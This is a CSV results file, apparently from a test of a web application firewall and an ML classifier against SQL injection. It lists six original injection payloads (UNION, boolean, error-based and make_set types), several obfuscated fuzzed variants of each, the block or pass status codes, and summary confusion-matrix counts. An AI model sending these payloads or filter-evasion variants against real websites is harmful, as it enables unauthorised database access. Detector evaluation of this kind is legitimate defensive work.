Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
45,2024-12-16T18:53:55.457479,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,403,403,403,both_correct,"1'  )  
where (SELECT 3767)  =  3767 and 6240  =    (  'qqpjq'||  (  select case  OR 0 when 'C'!='CA' then 1 else 0 end from rdb$database  )  ||'qzvzq'/*ikdv*/ )  --",2024-12-16T18:54:02.409819,403,403,both_correct,"'>X'!='>XY''  )  
where (SELECT 3767)  =  3767 and (SELECT 1)  =    (  'qqpjq'||  (  select case/**/ OR (SELECT 0) when 'C'!='CA' then 1 else 0 end from rdb$database  )  ||'qzvzq'/**/ )
 --",2024-12-16T18:54:11.182638,403,403,both_correct,"'>X'<>'>XY''  )  	where (SELECT (SELECT 1))  =  3767 and (SELECT 1)  =    (  'qqpjq'||  (  select case/**/ OR (SELECT 0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT 0) end from rdb$database  )  ||'qzvzq'  )
 --",2024-12-16T18:54:21.098496,403,403,both_correct,"'>X' NOT LIKE '>XY''  )  
where (SELECT (SELECT 1))  =  (SELECT 1) and (SELECT 'I'<>'IO')  =    (  'qqpjq'||  (  select case  OR (SELECT 0x0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT 0) end from rdb$database  )  ||'qzvzq'  )
 --",2024-12-16T18:54:32.588050,403,403,both_correct,"'>X' not like '>XY''  )  	where (SELECT (SELECT (SELECT 1)))  =  (SELECT 0x1) and (SELECT 'I'<>'IO')  =    (  'qqpjq'||  (  select case  OR (SELECT 0x0) when 'C'!='CA' then 'F;' NOT LIKE 'F;/' else (SELECT '['='[') end from rdb$database  )  ||'qzvzq' /**/)
 --",2024-12-16T18:54:44.804265,403,403,both_correct
46,2024-12-16T18:54:58.282453,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",403,403,403,both_correct,"-0x2017%""  ) /**/ union	all SeLECt 3877,(SElect 1),'%' NOT LIKE '%2',3877,3877,3877--",2024-12-16T18:55:01.204243,403,403,both_correct,"-0x2017%""  ) /*8*/ union all SElECT 3877,(sELECT '^0'/**/not like '^0Z'),'%' NOT LIKE '%(SELECT 2)',3877, or 0,3877--",2024-12-16T18:55:06.288691,403,403,both_correct,"-0x2017%""  ) /*(SELECT 8)*/ union all selEct 3877,(SelEct	'^0'/**/not like '^0Z'),'%' NOT LIKE '%(SELECT/**/'/)""'<>'/)""6')',3877, Or 0,(SELECT 1)--",2024-12-16T18:55:13.059276,403,403,both_correct,"-0x2017%""  ) /*(SELECT (SELECT 8))*/ union all selEct 9206 NOT LIKE 9207,(SelEct
'^0' not like '^0Z'),'%' NOT LIKE '%(SELECT/*Rtm@=*/'/)""'<>'/)""6')',3877, Or  aNd 1,(SelecT 1)--",2024-12-16T18:55:21.053714,403,403,both_correct,"-0x2017%""  ) /*(SELECT (SELECT 8))*/ union all selEct 9206 NOT LIKE '=FFc'='=FFc',(SelEct '^0' not like '^0Z'),'%' NOT LIKE '%(SELECT/*Rtm@=*/'/)""'<>'/)""6')', And (SELECT 1), or  anD/**/1,(select 1)--",2024-12-16T18:55:30.374926,403,403,both_correct
47,2024-12-16T18:55:40.954056,"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",403,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg wHeRe 4580   lIke   2082!=2083 AND 4241  =  convert  (  int,  (  SeLect char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  ( /**/ Or 0  )  +char  (  113  )  +  (  seLeCt   (  CAsE WHEN   (  4241 	=  4241  )   thEN char  (  49  )   eLSe char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",2024-12-16T18:55:58.631347,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg wheRE 4580   lIKE   0x822!=2083 AnD 4241  =  convert  (  int,  (  SeLect char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )  +char  (  113  )  +  (  SeLEcT   (  CAse WHEn   (  4241  =  4241  )   theN char  (  49  )   eLse char  (  48  )   EnD   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SELECT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  113   )    )     )  --",2024-12-16T18:56:18.503013,403,200,waf_correct_ml_incorrect,"1""  )   AS nixg WHEre 4580   LIke   0x822!=2083 anD 4241  =  convert  (  int,  (  seleCt char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )  +char  (  113  )  +  (  seLECT   (  CAse WheN   (   OR 0<>5371   Like   4241  )   THEN char  (  49  )   ElSE char  (  48	 )   EnD   )    )   +char  (  113  )  +char  (  122  )  +char  (  (sElECt 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71/**/  )    )     )  --",2024-12-16T18:56:38.880753,403,200,waf_correct_ml_incorrect,"1""  )   aS nixg WheRE 4580   liKE   0x822 NOT LIKE 2083 anD 4241  =  convert  (  int,  (  sELEct char  (  0x71  )  +char  (  113  )  +char  (  112  )  +char  (   or 0  )	 +char  (  '_'<>'_w'  )  +  (  SeLEct   (  CAse wHeN   (   Or  AND 1<>0x14fb   likE   4241  )   ThEN char  (  49  )   else char  (  48	 )   End   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SeLecT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71   )    )     )  --",2024-12-16T18:57:00.029773,403,200,waf_correct_ml_incorrect,"0x1""  )   as nixg wHeRe 4580  
LIkE   0x822 NOT LIKE 2083 aNd  OR 0  =  convert  (  int,  (  SElECt char  (  0x71  )  +char /**/(  113  )  +char  (  112  )  +char  (   OR 0  )	 +char  (  '_'<>'_w'  )  +  (  SeLEct   (  caSE When   (   oR  anD '	' NOT LIKE '	l'<>0x14fb   lIkE   4241  )   tHEN char  (  49  )   elSE char  (  48	 )   eND   )    )   +char  (  113  )  +char  (  122  )  +char  (  (SElEcT 1)  )  +char  (  '[$'<>'[$>'  )  +char  (  0x71   )    )     )  --",2024-12-16T18:57:21.899727,403,200,waf_correct_ml_incorrect
48,2024-12-16T18:57:44.966989,56,200,200,200,both_correct,'T' not like 'T(',2024-12-16T18:57:45.207504,200,403,waf_correct_ml_incorrect,"'T'
not like/**/'T('",2024-12-16T18:57:47.101887,200,200,both_correct,'T' not/**/like/**/'T(',2024-12-16T18:57:49.165490,200,200,both_correct,'T'/*y<*/not/**/lIKE/**/'T(',2024-12-16T18:57:51.354784,200,200,both_correct,'T'/*y<*/not	liKE/**/'T(',2024-12-16T18:57:53.762504,200,200,both_correct
49,2024-12-16T18:57:56.037595,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",403,403,403,both_correct,"-5202 union all SELeCt/**/5332,5332,5332,
AnD 1=8146,0x14d4,5332,5332#R",2024-12-16T18:57:58.877322,403,403,both_correct,"-5202 union all seLeCT 5332,5332, OR 0, AnD (SELECT 1)=8146,0x14d4,'51' NOT LIKE '51u',5332#RU",2024-12-16T18:58:03.273806,403,403,both_correct,"- And (SELECT 1) union all sElEcT 5332,'<'<>'<3', oR 0, aND/**/(SeleCT 1)=8146,0x14d4,'51' not
like '51u',5332#RU",2024-12-16T18:58:09.043260,403,403,both_correct,"- aNd (sEleCt  OR 0) union all SElEct 5332,'<' not like '<'8E]Y'!='8E]Y9'',/*]A*/oR 0, AnD/**/(SELECT 1)=8146,0x14d4,'51' not like '51u',0x14d4#RU",2024-12-16T18:58:15.560774,403,403,both_correct,"- and (SeLEct  OR (SELECT 0)) union all SelEcT  and 1,'<' not like '<'8E]Y'!='8E]Y9'', Or	0, And/*-AD,d*/(selECT 1)='.s=V'='.s=V',0x14d4,'51' not like '51u',0x14d4#RU",2024-12-16T18:58:23.528158,403,403,both_correct
50,2024-12-16T18:58:32.380945,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",403,403,200,waf_correct_ml_incorrect,"-8791""   )    )     )   or make_set  (  3173 IN (3172,3173,3174)  =  6620, AND (SELECT 1)  )   and /**/ 	(    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:58:37.476014,403,403,both_correct,"- or 0""   )    )     )   or make_set  (  3173 IN ((SELECT 3172),3173,3174)  =  1247!=1248, AND (SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:58:44.883223,403,403,both_correct,"- OR 0""   )    )     ) 	 or make_set  (  3173 IN ((SELECT 3172),3173, AND 1)  =  'l'!='l_'!=(SELECT 1248), AND (SELECT 1)  )   and    (    (     (/**/ ""pvdk""  =  ""pvdk",2024-12-16T18:58:52.958698,403,403,both_correct,"- or 3053 In (3052,3053,3054)""   )    )     ) 	 or make_set  (  (SELECT 3173) IN ((SELECT  AND 1),3173, AND 1)  =  'l'!='l_'!=(SELECT 1248), AND	(SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:59:02.136055,403,403,both_correct,"- or 3053 IN (3052,3053,(seLEct  AND 1))""   )    )     ) 	 or make_set  (  (SELECT 3173) IN ((SELECT  AND 1),3173, AND 1) /**/=  'l'!='l_'!=(SELECT 'ct' NOT LIKE 'ct*'), AND
(SELECT 1)  )   and    (    (     (  ""pvdk""  =  ""pvdk",2024-12-16T18:59:12.436965,403,403,both_correct

Overall Results
WAF TP,165
WAF TN,103
WAF FP,5
WAF FN,27
ML TP,113
ML TN,103
ML FP,5
ML FN,79

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,201,15
ML Incorrect,67,17
